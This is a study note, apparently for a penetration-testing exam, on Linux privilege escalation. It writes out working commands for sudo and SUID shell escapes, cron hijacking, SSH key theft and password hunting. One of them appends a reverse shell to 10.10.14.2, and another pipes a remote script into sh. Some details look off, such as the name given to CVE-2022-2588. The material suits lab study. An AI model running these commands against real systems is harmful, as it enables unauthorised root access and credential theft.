---
id: gs-106
module: Getting Started
kind: note
title: "Privilege Escalation Fundamentals"
description: "Sudo enumeration, SUID binaries, SSH key theft, cron job hijacking, credential reuse, kernel exploits, automated enumeration scripts."
tags: [privilege-escalation, sudo, suid, ssh-keys, cron-jobs, credentials, linpeas, gtfobins]
---

# Privilege Escalation Fundamentals

## Why Privilege Escalation Matters

Initial access usually grants low-privileged user (web server user, service account).
Privesc converts this to **root** (Linux) or **SYSTEM** (Windows) = full system control.

**On exam:** Root flag is ~50% of points; don't skip this phase.

---

## Phase 1: Information Gathering

### Current User & Capabilities

```bash
id                      # UID, GID, groups
whoami                  # username
sudo -l                 # allowed sudo commands (with/without password)
cat /etc/passwd         # all users on system
cat /etc/group          # group membership
groups                  # current user's groups
```

### System Info

```bash
uname -a                # kernel version (for kernel exploits)
lsb_release -a          # Linux distribution + version
ps aux                  # running processes (look for interesting services)
```

### Automated Tools (Preferred in Real Exams)

```bash
# Download LinPEAS (most current):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Or LinEnum (older but still good):
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Both tools run privesc checks automatically; output highlights likely vectors in color.

---

## Phase 2: Quick Wins (Check These First)

### A. Sudo Privileges (Fastest)

```bash
sudo -l
```

**Output example:**
```
User user1 may run the following commands on target:
    (root) NOPASSWD: /bin/bash
    (root) NOPASSWD: /usr/bin/find
    (ALL : ALL) ALL
```

**Exploitation:**

| Sudo Entry | Exploit |
|------------|---------|
| `(root) NOPASSWD: /bin/bash` | `sudo bash` → immediate root shell |
| `(root) NOPASSWD: /usr/bin/find` | `sudo find / -type f -name flag.txt` → root privs |
| `(root) NOPASSWD: /usr/bin/php` | `sudo php -r "system('/bin/bash');"` → root shell |
| `(ALL : ALL) ALL` | `sudo su -` → become root (if password known) |
| `(root) NOPASSWD: /home/user/script.sh` | If script is writable: edit it, append reverse shell |

**Check GTFOBins** (https://gtfobins.github.io/) for each binary to find escape routes.

### B. Cron Jobs (Root Executes Script You Control)

```bash
crontab -l              # current user's cron jobs
cat /etc/crontab        # system-wide cron
cat /etc/cron.d/*       # cron.d directory
ls -la /var/spool/cron/crontabs/root  # root's crontab (if readable)
```

**Exploitation workflow:**

```bash
# 1. Find script that runs as root
cat /etc/crontab | grep root
# Output: */5 * * * * root /home/user/monitor.sh

# 2. Check if you own or can write to it
ls -la /home/user/monitor.sh
# Output: -rwxrwxrwx 1 user user (world-writable!)

# 3. Append reverse shell (or read flag with root privs)
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"' >> /home/user/monitor.sh

# 4. Wait for cron to execute (check interval: */5 = every 5 min)
# Listen on attacker: nc -lvnp 4444
```

### C. SUID Binaries (Run as Owner, Usually root)

```bash
find / -perm -u=s -type f 2>/dev/null
# -perm -u=s = has SUID bit set
```

**Example output:**
```
/usr/bin/sudo        (expected)
/usr/bin/passwd      (expected)
/usr/bin/find        (suspicious!)
/usr/bin/vim         (suspicious!)
/usr/bin/less        (suspicious!)
```

**Check GTFOBins for each suspicious binary.**

**Common escapes:**

```bash
# In vim (SUID):
vim
:!/bin/bash

# In find (SUID):
find . -type f -exec /bin/bash \;

# In less (SUID):
less /etc/passwd
!bash

# In perl (SUID):
perl -e 'system("/bin/bash")'
```

### D. SSH Keys (Read Root's Private Key)

```bash
ls -la /root/.ssh/id_rsa
cat /root/.ssh/id_rsa
```

**If readable:**
```bash
# Copy key to attacker machine, set perms
ssh -i id_rsa root@localhost
# or if SSH doesn't listen locally:
ssh -i id_rsa root@$TARGET_IP
```

**If /root/.ssh/authorized_keys is writable:**
```bash
# On attacker: generate key
ssh-keygen -f mykey

# On target (if you have write perms to /root/.ssh/):
cat mykey.pub >> /root/.ssh/authorized_keys

# From attacker:
ssh -i mykey root@$TARGET_IP
```

---

## Phase 3: Credential Reuse

Sometimes same password used across accounts or services.

### Check Config Files

```bash
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -i pass
```

### Check Command History

```bash
history
cat ~/.bash_history
cat /home/*/bash_history
env | grep -i pass
```

### Check Process Command-Line Arguments

```bash
ps aux | grep -i password
# May show MySQL/database credentials in startup args
```

### If Password Found, Try

```bash
su - root
# or
sudo su -
# or
ssh root@localhost
```

---

## Phase 4: Kernel Exploits (Last Resort)

**Risk:** Can crash system, kill stability, unstable on exam.

### Check Kernel Version

```bash
uname -a
# Output: Linux target 3.9.0-73-generic #80-Ubuntu ... x86_64
```

### Search for CVE

```bash
searchsploit "Linux 3.9"
searchsploit kernel Ubuntu 20.04
```

### Compile & Run (if found)

```bash
gcc -o exploit exploit.c
./exploit
# Risky! May cause crash. Only if everything else failed.
```

**Famous kernel exploits:**
- **DirtyCow** (CVE-2016-5195) — Linux 2.6.22 to 4.8.3
- **PwnKit** (CVE-2021-4034) — Linux pkexec all versions before 0.120
- **OverflowClip** (CVE-2022-2588) — Linux 5.8 to 5.19 (niche)

---

## Automated Privesc Enumeration Tools

### LinPEAS (Most Updated, Recommended)

```bash
# Download & run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Output:**
- Colored output (RED = likely vuln, Yellow = check this)
- Sudo entries, SUID bins, cron jobs
- Kernel version with known CVEs
- Suggested exploits

### HackTricks Checklist

Website: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

Comprehensive checklist of all checks to perform manually if tools fail.

---

## Decision Tree (What to Try First)

```
$ id → non-root user
├─ sudo -l
│  ├─ NOPASSWD entry? → sudo <command>
│  ├─ ALL entry + password known? → sudo su -
│  ├─ Editable script as root? → Append reverse shell
│  └─ Nothing useful? → Continue
├─ crontab -l
│  ├─ Root cron calling writable script? → Exploit it
│  └─ Nothing? → Continue
├─ find / -perm -u=s 2>/dev/null (top 20 results)
│  ├─ Unusual SUID? → Check GTFOBins
│  └─ Nothing? → Continue
├─ ls -la /root/.ssh/id_rsa
│  ├─ Readable? → ssh -i key root@localhost
│  └─ Not readable? → Continue
├─ grep -r "password" /var/www/ /home/ 2>/dev/null
│  ├─ Found? → su root or sudo su -
│  └─ Nothing? → Continue
└─ Last resort: uname -a → searchsploit kernel
```

---

## Common Privesc Scenarios on Exam

| Scenario | Exploit | Time Est |
|----------|---------|----------|
| `sudo bash` allowed | Run it immediately | < 30 sec |
| Root cron + writable script | Append shell, wait 1-5 min | 5 min |
| SUID vim / find / perl | GTFOBins escape | < 2 min |
| SSH key readable | Copy key, ssh root@localhost | 1 min |
| Config file with creds | su / sudo with creds | 1 min |
| Kernel exploit available | Compile, run, risky | 3-10 min |

**Exam tip:** If first 3 options fail, you're either on wrong path or missing something. Re-enumerate or check if initial foothold was correct.

---

## Gotchas & Common Mistakes

1. **Breaking writable scripts with bad edits** — Always backup before appending: `cp script.sh script.sh.bak`
2. **Running kernel exploit immediately** — Can crash box. Try everything else first.
3. **Forgetting password may be known** — Try creds from configs with `su` even if `sudo -l` says no NOPASSWD
4. **SSH key permissions too permissive** — SSH will refuse keys with perms > 600; use `chmod 600 key`
5. **Hardcoding attacker IP in cron exploit** — Use `$ATTACKER_IP` env var or hardcode at runtime
6. **Web shell execution as www-data doesn't inherit root cron** — File must be readable by www-data user; check with `su - www-data -s /bin/bash`
7. **LinPEAS output overwhelming** — Focus on RED and YELLOW lines; ignore GREEN (common, expected)

---

## Related Notes

[[../linux-privallege-escalation/]] — Deep dive into each privesc technique  
[[../windows-privesc/]] — Windows-specific escalation (token abuse, registry, services)  
[[../ad-enum-attacks/]] — Escalation paths in Active Directory environments
